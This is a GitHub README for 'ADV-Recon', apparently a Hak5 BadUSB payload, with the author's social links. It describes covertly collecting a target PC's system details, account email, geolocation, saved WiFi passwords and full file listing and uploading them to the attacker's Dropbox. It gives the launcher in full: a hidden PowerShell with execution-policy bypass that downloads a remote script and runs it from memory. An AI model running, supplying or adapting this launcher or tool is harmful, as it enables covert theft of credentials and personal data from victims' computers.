![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# ADV-Recon

A script used to do an advanced level of Recon on the targets computer

## Description

This program enumerates a target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
The GeoLocation (latitude and longitude) of where the script was ran.
The SSID and WiFi password of any current or previously connected to networks.
It determines the last day they changed thier password and how many days ago.
Intel on the system Info, HDDs, network interfaces, TCP connections, Processes, Services, Installed software, drivers, and video card 
Along with TREE list of all files in the target computer is gathered and uploaded to your DropBox cloud storage

## Getting Started

### Dependencies

* DropBox or other file sharing service - Your Shared link for the intended file
* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
```
powershell -w h -NoP -NonI -Ep Bypass iwr https://raw.githubusercontent.com/I-Am-Jakoby/1/main/ADV-Recon.ps1 | iex
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
    <td align="center" width="96">
      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>TikTok
    </td>    
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>
